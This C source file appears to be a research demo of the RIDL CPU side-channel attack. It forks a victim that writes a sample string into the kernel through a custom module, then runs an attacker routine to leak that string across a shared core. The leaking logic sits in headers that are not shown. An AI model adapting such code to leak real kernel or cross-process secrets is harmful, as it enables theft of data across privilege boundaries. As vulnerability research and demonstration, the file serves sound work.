#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include "utils.h"


#define REPS 200000
#define WRITE_VALUE 42ull
#define CYCLE_LENGTH 400000000ull
#define PROC_INTERFACE "/proc/RIDL_interface"


inline void victim(char *secret, int cycle_length) {
    set_processor_affinity(writer_cpu);
    uint64_t * destination = aligned_alloc(_page_size, _page_size);
    int procfile = open("/proc/RIDL_interface", O_WRONLY);
    if(procfile < 0){
        printf("Failed to open the /proc file. Are you root?\n");
    }else{
        write(procfile, secret, strlen(secret));
        close(procfile);
    }
    while (1) { store_and_flush(7, destination); }
}

int main(int argc, char** args) {
    if(access(PROC_INTERFACE, F_OK)){
        printf("The RIDL kernel module does not seem to be loaded. Make sure that you load 'kernel_module/ridl_module.ko' before running this demo!\n");
        return 1;
    }
    printf("Demo 2c: Observing a string (store) in the kernel\n");
    get_same_core_cpus(&reader_cpu, &writer_cpu);
    _page_size = getpagesize();
    time_t tm;
    time(&tm);
    srand(tm);
    char *secret = sample_strings[random() % sample_string_count];
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0) + 1;
    if(((int64_t)mem) <= (int64_t)0){
        printf("Mapping the reload buffer failed. Did you allocate some huge pages?\n");
        return 1;
    }
    memset(mem, 0xFF, _page_size * 256);
    ridl_init(argc, args);
    pid = fork();
    if (!pid) {
        victim(secret, 1);
        return 0;
    }
    string_attacker(mem, CYCLE_LENGTH);
    kill(pid, SIGKILL);
    usleep(10000);

    ridl_cleanup();
    printf("Done.\n");
    return 0;
}

